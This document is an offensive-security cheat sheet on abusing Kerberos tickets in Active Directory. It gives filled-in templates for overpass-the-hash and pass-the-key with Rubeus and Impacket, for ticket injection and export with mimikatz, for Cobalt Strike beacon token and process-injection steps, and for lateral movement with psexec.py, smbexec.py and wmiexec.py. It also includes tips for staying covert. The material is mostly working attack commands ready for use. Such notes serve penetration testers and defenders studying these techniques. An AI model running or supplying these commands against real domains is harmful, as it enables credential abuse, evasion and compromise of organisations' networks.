# Active Directory - Kerberos tickets usage

### Overview

`Kerberos` is an authentication protocol used within Active Directory that rely
on the use of tickets to identify users and grant access to domain resources.
To do so, `Kerberos` implements two type of tickets, issued by two distinct
services of the `Key Distribution Center (KDC)`:
  - `Ticket-Granting Ticket (TGT)`, obtained from the `Authentication Service
  (AS)`.
  - `service tickets`, obtained from the `Ticket-Granting Service (TGS)`.

A valid `TGT` is necessary in order to request `service tickets`, which in turn
grant access to service accounts (user or machine domain accounts that have a
`ServicePrincipalName (SPN)`).

`Overpass-the-hash` / `Pass the Key (PTK)` are the actions of using,
respectively, the `NTLM` hash or the `Kerberos` secrets (`RC4` key,
corresponding to the `NTLM hash`, or the `AES 128/256 bits` keys) of an user to
request a `Kerberos` `TGT`.

`Pass-the-ticket (PtT)` is the action of directly using `Kerberos` tickets
(`TGTs` or `service tickets`) with out a request to the `KDC`. On Windows
systems, the tickets can be directly injected in the current logon session
while on Linux systems `Kerberos` tickets file can be provided to utilities
supporting the `Kerberos` authentication.

### Overpass-the-hash / Pass the Key (PTK)

The `Rubeus`'s `asktgt` module or the `Impacket`'s `getTGT.py` Python script
can be used to request `TGTs` using an user's password, `NTLM` hash, or
`Kerberos` secrets.

```
# ptt: Directly injects the received TGT in the current logon session. The current logon session TGT will be overwritten.
# In any case, the received TGT, encoded in base64, will be printed (KRB-CRED format).
Rubeus.exe asktgt /user:<USERNAME> [/password:<PASSWORD> | /rc4:<NTLM_HASH> | /aes128:<AES_128BITS_KEY> | /aes256:<AES_256BITS_KEY>] /ptt
Rubeus.exe asktgt /dc:<DC_IP | DC_HOSTNAME> /domain:<DOMAIN> /user:<USERNAME> [/password:<PASSWORD> | /rc4:<NTLM_HASH> | /aes128:<AES_128BITS_KEY> | /aes256:<AES_256BITS_KEY>] /ptt

# The received TGT will be exported to a file in the credential cache format.
python getTGT.py [-dc-ip <DC_IP>] <DOMAIN>/<USERNAME>:[<PASSWORD>]
python getTGT.py [-dc-ip <DC_IP>] -hashes ":<NTLM>" <DOMAIN>/<USERNAME>
# Recommended if possible in a covert scenario, as the AES keys are used by default by Microsoft.
python getTGT.py [-dc-ip <DC_IP>] -aesKey <AES_128BITS_KEY | AES_256BITS_KEY> <DOMAIN>/<USERNAME>
```

### Pass-the-ticket (PtT)

###### [Windows / Linux] Direct requests of service tickets

On Windows, the `Rubeus`'s `asktgs` module can can be used to request
`service tickets` using a valid `TGT`:

```
# ptt: Directly injects the received service ticket in the current logon session.

Rubeus.exe asktgs /ticket:<TGT_BASE64 | TGT_KIRBI_FILE_PATH> /service:<TARGET_SERVICE_SPN | TARGET_SERVICES_SPN> /ptt
```

###### [Windows] Injection into the current session

`Kerberos` tickets, in the credential format `KRB_CRED` (`KIRBI` file), can be
injected into the current logon session using `mimikatz` or `Rubeus`.

Both utilities leverage the Windows
`LsaCallAuthenticationPackage/KerbSubmitTicketMessage` API and will overwrite
the current logon session tickets.

```
# If necessary, decodes a ticket in base64 (from Rubeus for example) to the KRB_CRED format.
cat <TICKET_BASE64_FILE_PATH> | tr -d "[:space:]" | base64 --decode > <TICKET_KIRBI_FILE_PATH>

# Injects into memory a ticket in the KRB_CRED format.
Rubeus.exe ptt /ticket:<TICKET_BASE64_FILE_PATH | TICKET_KIRBI_FILE_PATH>
mimikatz.exe "kerberos::ptt <TICKET_KIRBI_FILE_PATH>" exit
```

`Cobalt Strike` 's `make_token` and `kerberos_ticket_use` `beacon` commands may
be used to inject tickets with out overwriting the ones cached in the current
logon session:

```
# Requires elevated privileges.
beacon> make_token <DOMAIN>\<USERNAME> "PasswordNotRequired"
beacon> kerberos_ticket_use <C2_TICKET_KIRBI_FILE_PATH>

# Does not requires a elevated privileges. Create a new beacon in a sacrificial process to protect the current beacon logon session tickets.
# The use of the make_token command is still necessary as both beacon share the same logon session.
original_beacon> make_token <DOMAIN>\<USERNAME> "PasswordNotRequired"
original_beacon> run <C:\Windows\System32\cmd.exe | BINARY_PATH>
original_beacon> ps
original_beacon> inject <NEW_PROCESS_PID> <x86 | x64> <LISTENER>
new_beacon> kerberos_ticket_use <C2_TICKET_KIRBI_FILE_PATH>

# Reverts the logon session created using the make_token command, so the original logon session's tickets are restored.
beacon | original_beacon> rev2self
```

The `Kerberos` tickets cached in the current logon session can be listed using
the Windows built-in `klist` utility, `Rubeus`'s `klist` module, or
`mimikatz`'s `kerberos::list` command:

```
klist

Rubeus.exe klist

mimikatz.exe "kerberos::list" exit
mimikatz.exe "kerberos::list /export" exit
```

###### [Linux] Credential cache (ccache)

`Kerberos` tickets can be converted from the `KRB_CRED` format to the
`credential cache (ccache)` format to be used with, among others, the
`Impacket`'s Python utilities. If a `TGT` is provided, the `Impacket`'s
utilities will try to obtain the necessary service tickets through request to
the `KDC`.

Refer to the `[Windows] Lateral movements` for more information on how to
leverage the `Impacket` suite for lateral movements in a Windows environment.

```
# If necessary, decodes a ticket in base64 (from Rubeus for example) to the KRB_CRED format.
cat <TICKET_BASE64_FILE_PATH> | tr -d "[:space:]" | base64 --decode > <TICKET_KIRBI_FILE_PATH>

# Converts the TGT from KRB_CRED to ccache.
ticketConverter.py  <TICKET_KIRBI_FILE_PATH> <TICKET_CCACHE_FILE_PATH>

export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>

# Usage of the TGT through Impacket's utilities.
psexec.py -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
smbexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
wmiexec.py [-service-name <SERVICE_NAME>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> [<COMMAND> <COMMAND_ARGS>]
[...]
